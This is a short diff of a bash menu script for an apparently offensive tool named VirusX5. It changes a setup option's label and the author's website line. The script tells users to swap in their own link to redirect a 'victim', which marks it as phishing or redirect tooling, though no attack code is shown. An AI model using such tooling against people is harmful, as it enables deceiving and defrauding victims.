@@ -27,7 +27,7 @@ echo "   "
 sleep 2
 echo 
 
-printf "\e[1;92m[\e[0m\e[1;77m1\e[0m\e[1;92m]\e[0m\e[1;93m Auto Setup (Currently Down)\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m1\e[0m\e[1;92m]\e[0m\e[1;93m Auto Setup (Activated Now)\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m2\e[0m\e[1;92m]\e[0m\e[1;93m Manual Setup\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m3\e[0m\e[1;92m]\e[0m\e[1;93m Update\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m4\e[0m\e[1;92m]\e[0m\e[1;93m Exit\e[0m\n"
@@ -43,7 +43,7 @@ python3 host.py
 elif [[ $option == 2 || $option == 02 ]]; then
 echo -e "$grn READ THE FOLLOWING STEPS $end"
 echo -e "$grn I highlighted the code where you replace my Website name to your website link where you wanted to redirect your victim $end"
-echo -e "$cyan  my website name is http://www.zaeemtechnical.ml $end"
+echo -e "$cyan my website: https://www.zaeemtechnical.ml $end"
 
 sleep 10
 cd $HOME/VirusX5/host
